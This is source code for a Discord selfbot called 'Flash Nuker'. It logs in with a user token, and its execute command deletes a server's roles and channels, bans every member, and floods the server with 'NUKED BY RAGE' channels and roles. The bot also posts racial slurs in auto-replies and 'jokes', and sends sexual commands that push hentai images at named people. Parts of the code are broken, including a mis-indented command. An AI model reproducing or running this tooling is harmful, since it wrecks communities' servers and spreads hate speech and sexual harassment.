class ServerNuker():
    __version__ = 3.5

import discord, subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes, pokepy
import urllib.parse, urllib.request, re, json, requests, webbrowser, aiohttp, dns.name, asyncio, functools, logging

from discord.ext import (
    commands,
    tasks
)
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from colorama import Fore
from sys import platform
from PIL import Image
import pyPrivnote as pn
from gtts import gTTS
from randomuser import RandomUser
from pythonping import ping as pyping

ctypes.windll.kernel32.SetConsoleTitleW(f'[Flash Server Wizz Tool v{ServerNuker.__version__}] | Loading in...')

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('pass')
prefix = config.get('prefix')
anti_afk = config.get('anti_afk')

width = os.get_terminal_size().columns  
def startprint():
     if anti_afk == True:
         antiafk = 'Enabled'
     else:
        antiafk = 'Disabled'

     print(f'''{Fore.RESET}
                      {Fore.RED} ______     ______     ______     ______    
                      {Fore.RED}/\___  \   /\  ___\   /\  == \   /\  __ \   
                      {Fore.RED}\/_/  /__  \ \  __\   \ \  __<   \ \ \/\ \  
                       {Fore.RED} /\_____\  \ \_____\  \ \_\ \_\  \ \_____\ 
                        {Fore.RED}\/_____/   \/_____/   \/_/ /_/   \/_____/ 
                                            
                                    
                        {Fore.RED}Logged In As ==> {Fore.WHITE}{Ioxide.user.name}#{Ioxide.user.discriminator}{Fore.WHITE}
                        {Fore.RED}ID ==> {Fore.WHITE}{Ioxide.user.id}
                        {Fore.RED}Anti-AFK ==> {Fore.WHITE}{antiafk}
                        {Fore.RED}Version ==> {Fore.WHITE} v{ServerNuker.__version__}
                    '''+Fore.RESET)


def Clear():
    os.system('cls')
Clear()

def Init():
    if config.get('token') == "token-here":
        Clear()
        print(f"{Fore.WHITE}[ERROR] {Fore.YELLOW}You didnt put your token in the config.json file"+Fore.RESET)
    else:
        token = config.get('token')
        try:
            Ioxide.run(token, bot=False, reconnect=True)
            os.system(f'title [ Flash Nuker ] - Version {ServerNuker.__version__}')
        except discord.errors.LoginFailure:
            print(f"{Fore.WHITE}[ERROR] {Fore.YELLOW}Sure this is a token? lol"+Fore.RESET)
            os.system('pause >NUL')

class Login(discord.Client):
    async def on_connect(self):
        guilds = len(self.guilds)
        users = len(self.users)
        print("")
        print(f"Connected to: [{self.user.name}]")
        print(f"Token: {self.http.token}")
        print(f"Guilds: {guilds}")
        print(f"Users: {users}")
        print("-------------------------------")
        await self.logout()

colorama.init()
Ioxide = discord.Client()
Ioxide = commands.Bot(
    description='Flash Bot',
    command_prefix=prefix,
    self_bot=True
)
Ioxide.remove_command('help') 

@Ioxide.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}You're missing permission to execute this command"+Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Missing arguments: {error}"+Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Not a valid image"+Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Discord error: {error}"+Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}Couldnt send a empty message"+Fore.RESET)               
    else:
        print(f"{Fore.WHITE}Error: {Fore.YELLOW}{error_str}"+Fore.RESET)

@Ioxide.event
async def on_message_edit(before, after):
    await Ioxide.process_commands(after)

@Ioxide.event
async def on_message(message):
    responses = ["what nigga", "shut up and focus son", "nigga im right here lmfao", "sybau and focus on gettin blazed","I got 2 dicks in my ass and u still cant pack me. fuck up nigga"]
    nums = [1, 1.3, 1.5, 2, 2.3, 2.6, 3, 3.8, 5, 4, 6, 7]
    ptime = random.choice(nums)
    ## Begin Long Annoying Anti-AFK Checking..
    if 'afk c' in message.content:
        if anti_afk == True:
                try:
                    randomResponses = random.choice(responses)
                    msg = randomResponses
                    time.sleep(ptime)
                    await message.channel.send(msg)
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.RED}was unable to send message at{Fore.WHITE} {time}"+Fore.RESET)
    elif 'AFK C' in message.content:
        if anti_afk == True:
            try:
                randomResponses = random.choice(responses)
                time.sleep(ptime)
                msg = randomResponses
                await message.channel.send(msg)
            except discord.errors.Forbidden:
                print(""
                f"\n{Fore.RED}was unable to send message at{Fore.WHITE} {time}"+Fore.RESET)

    elif 'AFK c' in message.content:
        if anti_afk == True:
            try:
                randomResponses = random.choice(responses)
                time.sleep(ptime)
                msg = randomResponses
                await message.channel.send(msg)
            except discord.errors.Forbidden:
                print(""
                f"\n{Fore.RED}was unable to send message at{Fore.WHITE} {time}"+Fore.RESET)
        return

    await Ioxide.process_commands(message)

@Ioxide.event
async def on_connect():
    Clear()

    if anti_afk == True:
        antiafk = "Enabled"
    else:
        antiafk = "Disabled"

    startprint()
    ctypes.windll.kernel32.SetConsoleTitleW(f'[ Flash Nuker Tool v{ServerNuker.__version__} ] | Logged in as {Ioxide.user.name}')

@Ioxide.command()
async def help(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="_Zero_",color= discord.Color(0x000000))
    em.add_field(name="_*massban*_",value="under construction",inline=False)
    em.add_field(name="_*AntiAfk and afk*_",value="Anti afk under contruction but use check to afk check",inline=False)
    em.add_field(name="_*nuke*_",value="destroys channels and roles",inline=False)
    em.add_field(name="_*Trolling*_",value="under contruction",inline=False)
    em.add_field(name="_*nsfw*_",value="view all nsfw commands",inline=False)
    em.set_image(url="https://tenor.com/view/tokyo-gif-20808079")
    em.set_footer(text="Get killed loser")
    await ctx.send(embed=em)
@Ioxide.command()
async def nsfw(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="__NSFW__",color= discord.Color(0x808080))
    em.add_field(name="fuck",value="lol",inline=False)
    em.add_field(name="boobs",value="lol",inline=False)
    em.add_field(name="pussy",value="lol",inline=False)
    em.add_field(name="cum",value="lol",inline=False)
    em.add_field(name="head",value="lol",inline=False)
    em.add_field(name="anal",value="lol",inline=False)
    em.add_field(name="kiss",value="lol",inline=False)
    em.add_field(name="spank",value="lol",inline=False)
    em.set_image(url="https://tenor.com/view/hibana-gif-21601546")
    em.set_footer(text="get them cheeks wrecked")
    await ctx.send(embed=em)
@Ioxide.command()
async def fuck(ctx, recipients):
    await ctx.message.delete() 
    if isinstance(ctx.message.channel, discord.GroupChannel): # makes it work in gcs (finally got it i was so retarded LOL)
        r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**fucked**_ '+recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])

    elif isinstance(ctx.message.channel, discord.DMChannel): # makes it work in dms
            r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
            res = r.json()
            em = discord.Embed(description=Ioxide.user.name+' _**fucked**_ '+recipients, color= discord.Color(0x000000))
            em.set_image(url=res['url'])
    await ctx.send(embed=em) 
@Ioxide.command()
async def anal(ctx, recipients):
    await ctx.message.delete() 
    if isinstance(ctx.message.channel, discord.GroupChannel):
        r = requests.get("https://nekos.life/api/v2/img/anal")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**gave**_ '+recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])

    elif isinstance(ctx.message.channel, discord.DMChannel):
        r = requests.get("https://nekos.life/api/v2/img/anal")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**gave**_ '+recipients+' _**anal**_ ', color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    await ctx.send(embed=em) 
@Ioxide.command()
async def afk(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="_AFK Help_",color= discord.Color(0x000000))
    em.add_field(name="_*AfkCheck*_",value="Starts an afk check",inline=False)
    em.set_image(url="https://tenor.com/view/anime-girl-animesword-animeskil-gif-22457252")
    em.set_footer(text="dont fold lmfao")
    await ctx.send(embed=em)
@Ioxide.command(aliases=['sayajoke','jokepack'])
async def joke(ctx):
    ## idfk how to do tables for the jokes or this would be cleaner
    jokes = ["Nigga you overdosed from adrenaline rushes nigga fuck is you sayin","Aye nigga the first time you rode a skateboard you started twisting yo spine back and forth thinking you was accelerating nigga you dumb as shit","That wasn't funny nigga that's why yo long lost pet jaguar was found in west virginia eating rat soup in a pawn shop nigga you ugly as shit","That's why all yo subscribers unsubbed from yo youtube channel the first time you did a face-cam because you was ugly as shit","you smell like shit boy you shower with orange juice smelly ass nigga","you have sex with indian cockaroaches goofy ass nigga","your tities built like doritos nasty ass nigga Mmmm doritos nacho titty ass nigga","When you sneeze you got no recoil boy you be sendin yo spit everywhere"]
    await ctx.message.delete()
    randomJoke = random.choice(jokes)
    msg = randomJoke
    await ctx.send(msg)
   
@Ioxide.command()
async def wizzing(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="_*Wizzing Help*_",color= discord.Color(0x000000))
    em.add_field(name="_*Destroy*_",value="Fucks a servers channels and roles",inline=False)
    em.set_image(url="https://tenor.com/view/luffy-like-aboss-one-piece-gif-4973662")
    em.set_footer(text="Nothing but a L for u")
    await ctx.send(embed=em)
@Ioxide.command()
async def check(ctx):
    await ctx.message.delete()
    await ctx.send('afk check')
    time.sleep(0.4)
    await ctx.send('10')
    time.sleep(0.4)
    await ctx.send('9')
    time.sleep(0.4)
    await ctx.send('8')
    time.sleep(0.4)
    await ctx.send('7')
    time.sleep(0.4)
    await ctx.send('6')
    time.sleep(0.4)
    await ctx.send('5')
    time.sleep(0.4)
    await ctx.send('4')
    time.sleep(0.4)
    await ctx.send('3')
    time.sleep(0.4)
    await ctx.send('2')
    time.sleep(0.4)
    await ctx.send('1')
    time.sleep(0.4)
    await ctx.send('0')
       
@Ioxide.command()
async def blood(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="_GET YOUR LIFE BACK IN BLOOD_",color= discord.Color(0x000000))
    em.set_image(url="https://tenor.com/view/one-piece-luffy-monkeyd-dluffy-head-down-bow-down-gif-12132743")
    await ctx.send(embed=em)
    
@Ioxide.command()
async def smoke(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="_WHO I SMOKE???_",color= discord.Color(0x000000))
    em.add_field(name="_*My Sons*_",value="Flex, Zeus Account, Shirus, Skeezer, Kami",inline=False)
    await ctx.send(embed=em)
    
    
@Ioxide.command()
async def maker(ctx):
    await ctx.message.delete()
    em = discord.Embed(title="_GodSpeed_",color= discord.Color(0x000000))
    em.add_field(name="_**Primo made this**_",value="ScreamW",inline=False)
    em.set_image(url="https://tenor.com/view/eobard-thawne-dagger-destroyed-reverse-flash-gif-14204484")
    em.set_footer(text="Made By Primo")
    await ctx.send(embed=em)
@Ioxide.command()
async def cum(ctx, recipients):
    await ctx.message.delete() 
    if isinstance(ctx.message.channel, discord.GroupChannel):
        r = requests.get("https://nekos.life/api/v2/img/cum")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**came inside**_ '+recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])

    elif isinstance(ctx.message.channel, discord.DMChannel):
        r = requests.get("https://nekos.life/api/v2/img/cum")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**came inside**_ '+recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    await ctx.send(embed=em) 

@Ioxide.command()
async def head(ctx, recipients):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        r = requests.get("https://nekos.life/api/v2/img/blowjob")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**got head from**_ '+ recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    elif isinstance(ctx.message.channel, discord.DMChannel):
        r = requests.get("https://nekos.life/api/v2/img/blowjob")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**got head from**_ '+ recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Ioxide.command()
async def spank(ctx, recipients):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        r = requests.get("https://nekos.life/api/v2/img/spank")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**spanked**_ '+ recipients+"'s _**fat ass**_ ", color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    elif isinstance(ctx.message.channel, discord.DMChannel):
        r = requests.get("https://nekos.life/api/v2/img/spank")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**spanked**_ '+ recipients+"'s _**fat ass**_ ", color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Ioxide.command()
async def boobs(ctx, recipients):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        r = requests.get("https://nekos.life/api/v2/img/boobs")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**played with**_ '+ recipients +"'s _**boobs**_ ", color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    elif isinstance(ctx.message.channel, discord.DMChannel):
        r = requests.get("https://nekos.life/api/v2/img/boobs")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**played with**_ '+ recipients +"'s _**boobs**_ ", color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Ioxide.command()
async def pussy(ctx, recipients):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.GroupChannel):
        r = requests.get("https://nekos.life/api/v2/img/pussy")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**fucked**_ '+ recipients +"'s _**wet pussy**_ ", color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    elif isinstance(ctx.message.channel, discord.DMChannel):
        r = requests.get("https://nekos.life/api/v2/img/pussy")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**fucked**_ '+ recipients +"'s _**wet pussy**_ ", color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    await ctx.send(embed=em)

@Ioxide.command()
async def kiss(ctx, recipients):
    await ctx.message.delete() 
    if isinstance(ctx.message.channel, discord.GroupChannel):
        r = requests.get("https://nekos.life/api/v2/img/kiss")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**kissed**_ '+recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])

    elif isinstance(ctx.message.channel, discord.DMChannel):
        r = requests.get("https://nekos.life/api/v2/img/kiss")
        res = r.json()
        em = discord.Embed(description=Ioxide.user.name+' _**kissed**_ '+recipients, color= discord.Color(0x000000))
        em.set_image(url=res['url'])
    await ctx.send(embed=em) 
@Ioxide.command()
async def punch(ctx, recipients):
    await ctx.message.delete() 
    if isinstance(ctx.message.channel, discord.GroupChannel):
        em = discord.Embed(description=Ioxide.user.name+' _**gave**_ '+recipients+' _**a death punch**_', color= discord.Color(0x000000))
        em.set_image(url="https://tenor.com/view/luffy-punch-gif-5394144")

    elif isinstance(ctx.message.channel, discord.DMChannel):
        em = discord.Embed(description=Ioxide.user.name+' _**punched**_ '+recipients+' _**lights out**_ ', color= discord.Color(0x000000))
        em.set_image(url="https://tenor.com/view/luffy-punch-gif-5394144")
    await ctx.send(embed=em) 

@Ioxide.command()
    async def execute(self, ctx):
        """Nukes the fucking shit outta the server banning everyone silently. While no one notices\nNext up it deletes all roles  then creates DiscoRape roles\nThen it deletes all channels possible to then make DiscoRape channels"""
        await ctx.message.delete()

        print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Started role DELETION")
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.roles[-1] > role:
                try:
                    await role.delete()
                    print(f"{Fore.GREEN}[-]ROLE > {Fore.RESET}Deleted {role}")
                except:
                    print(
                        f"{Fore.RED}[-]ROLE > {Fore.RESET}Failed to delete role: {role}"
                    )
            else:
                await ctx.send("There was an error while deleting the roles.")

        print(f"{Fore.RED}[-]ROLE > {Fore.RESET}Starting to nuke roles")

        for i in range(1, 50):
            try:
                await ctx.guild.create_role(
                    name=f"NUKED BY RAGE https://daddie.xyz {i}"
                )
                print(
                    f"{Fore.RED}[-]ROLE > {Fore.RESET}Made role NUKED BY RAGE https://daddie.xyz {i}"
                )
            except Exception as e:
                print(f"Error while makign role.\n\nError: {e}")
        # SPAM ROLE SHIT CANT BE ASKED TO MAKE IT
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}DELETED {channel}")
            except:
                print(f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Failed to delete {channel}")

                print(
            f"{Fore.RED}[-]DANGER > {Fore.RESET}Nuking has begun...\n{Fore.RED}[-]BANNING > {Fore.RESET}Banning process has begun\n"
        )
        
        for member in ctx.guild.members:
            print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Attempting to ban {member}")
            try:
                await member.ban()
                print(
                    f"{Fore.RED}[-]BANNING > {Fore.RESET}Successfully banned {member}"
                )
            except:
                print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Failed to ban {member}")

        print(f"{Fore.RED}[-]BANNING > {Fore.RESET}Finished banning members")        
        # delete all channels so we can flood that shit lmfao

        for i in range(1, 25):
            try:
                await ctx.guild.create_text_channel(
                    name=f"NUKED-BY-RAGE-{i}-https://daddie.xyz"
                )
                print(
                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made text channel! NUKED-BY-RAGE-{i}-https://daddie.xyz"
                )
                await ctx.guild.create_voice_channel(
                    name=f"NUKED BY RAGE {i} https://daddie.xyz"
                )
                print(
                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made voice channel! NUKED BY RAGE {i} https://daddie.xyz"
                )
                await ctx.guild.create_category(
                    name=f"NUKED BY RAGE {i} https://daddie.xyz"
                )
                print(
                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made category! NUKED BY RAGE {i} https://daddie.xyz"
                )
            except Exception as e:
                print(f"Error while making channels\nError: {e}")
        print(f"{Fore.RED}[-]NUKE > {Fore.RESET}Nuking finished!")

if __name__ == '__main__':
    Init()


